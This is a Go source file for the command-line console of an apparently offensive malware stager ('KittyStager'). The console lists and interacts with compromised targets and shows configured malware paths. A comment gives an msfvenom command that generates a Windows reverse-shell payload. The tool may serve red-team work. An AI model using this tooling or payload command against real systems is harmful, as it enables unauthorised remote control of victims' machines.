package cli

import (
	"GoStager/cmd/config"
	"GoStager/cmd/http"
	"GoStager/cmd/interact"
	"GoStager/cmd/util"
	"fmt"
	i "github.com/JoaoDanielRufino/go-input-autocomplete"
	"github.com/c-bata/go-prompt"
	color "github.com/logrusorgru/aurora"
	"strconv"
)

//msfvenom -p windows/x64/shell_reverse_tcp -f hex -o rev.hex LHOST=127.0.0.1 LPORT=4444

func completer(d prompt.Document) []prompt.Suggest {
	s := []prompt.Suggest{
		{Text: "exit", Description: "Exit the program"},
		{Text: "config", Description: "Show config"},
		{Text: "target", Description: "Show targets"},
		{Text: "interact", Description: "Interact with a target"},
	}
	return prompt.FilterHasPrefix(s, d.GetWordBeforeCursor(), true)
}

func Cli(conf config.General) {
	for {
		t := prompt.Input("KittyStager 🐈❯ ", completer)
		switch t {
		case "exit":
			return
		case "config":
			printConfig(conf)
		case "target":
			printTarget()
		case "interact":
			printTarget()
			fmt.Printf("%s\n", color.Yellow("\n[*] Please enter the id of the target"))
			id, err := i.Read("id: ")
			if err != nil {
				util.ErrPrint(err)
				break
			}
			s, err := strconv.Atoi(id)
			if err != nil {
				util.ErrPrint(fmt.Errorf("invalid input"))
				break
			}
			ip, err := findId(s)
			if err != nil {
				util.ErrPrint(err)
				break
			}
			if _, ok := http.Targets[ip]; !ok {
				util.ErrPrint(fmt.Errorf("invalid id"))
				break
			}
			fmt.Println()
			err = interact.Interact(http.Targets[ip].GetTarget())
			if err != nil {
				util.ErrPrint(err)
				break
			}
		}
	}
}

func printTarget() {
	fmt.Printf("%s\n", color.Green("[*] Targets:"))
	for ip, x := range http.Targets {
		fmt.Printf("%d - %s\n", x.GetId(), color.Yellow(ip))
	}
}

func findId(id int) (string, error) {
	for _, x := range http.Targets {
		if x.GetId() == id {
			return x.GetTarget(), nil
		}
	}
	return "", fmt.Errorf("invalid id")
}

func printConfig(conf config.General) {
	fmt.Printf("\n%s\t\t%s\n", color.Green("Host:"), color.Yellow(conf.GetHost()))
	fmt.Printf("%s\t\t%d\n", color.Green("Port:"), color.Yellow(conf.GetPort()))
	fmt.Printf("%s\t%s\n", color.Green("Endpoint:"), color.Yellow(conf.GetEndpoint()))
	fmt.Printf("%s\t%s\n", color.Green("UserAgent:"), color.Yellow(conf.GetUserAgent()))
	fmt.Printf("%s\t\t%d\n", color.Green("Sleep:"), color.Yellow(conf.GetSleep()))
	for _, v := range conf.GetMalPath() {
		fmt.Printf("%s\t%s\n", color.Green("Malware path:"), color.Yellow(v))
	}
	fmt.Println()
}
